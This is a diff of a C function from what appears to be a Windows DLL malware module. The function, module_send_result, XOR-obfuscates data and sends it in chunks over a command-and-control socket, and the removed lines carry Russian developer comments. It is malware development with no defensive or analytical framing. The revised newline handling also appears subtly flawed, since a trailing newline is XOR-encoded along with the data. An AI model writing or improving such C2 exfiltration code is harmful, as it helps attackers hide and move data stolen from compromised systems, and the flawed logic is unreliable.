@@ -21,34 +21,26 @@ static void module_log(const char* msg) {
 static void module_send_result(const uint8_t* data, size_t len) {
     if (g_c2_socket == INVALID_SOCKET) return;
     
-    // Выделяем буфер под зашифрованные данные + 1 байт для \n
-    // Используем HeapAlloc (стабильнее в DLL контексте)
-    size_t total_len = len + 1;
-    uint8_t* encrypted = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, total_len);
-    if (!encrypted) {
-        OutputDebugStringA("[MODULE] HeapAlloc failed\n");
-        return;
-    }
+    // Проверяем, есть ли уже \n в конце
+    bool has_newline = (len > 0 && data[len-1] == '\n');
+    size_t total_len = has_newline ? len : len + 1;
     
-    // XOR шифрование
+    uint8_t* encrypted = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, total_len);
+    if (!encrypted) return;
+    
     for (size_t i = 0; i < len; i++) {
         encrypted[i] = data[i] ^ 0xAA;
     }
-    encrypted[len] = '\n';
+    if (!has_newline) {
+        encrypted[len] = '\n';
+    }
     
-    // Чанковая отправка (64 КБ)
     const size_t CHUNK_SIZE = 65536;
     size_t sent = 0;
     while (sent < total_len) {
         size_t to_send = (total_len - sent > CHUNK_SIZE) ? CHUNK_SIZE : (total_len - sent);
         int res = send(g_c2_socket, (const char*)(encrypted + sent), (int)to_send, 0);
-        
-        // FIX: Если res <= 0 (ошибка или закрытие), прерываем цикл. 
-        // Иначе может быть бесконечный цикл при res=0.
-        if (res <= 0) {
-            OutputDebugStringA("[MODULE] Send interrupted\n");
-            break; 
-        }
+        if (res <= 0) break;
         sent += res;
     }
     
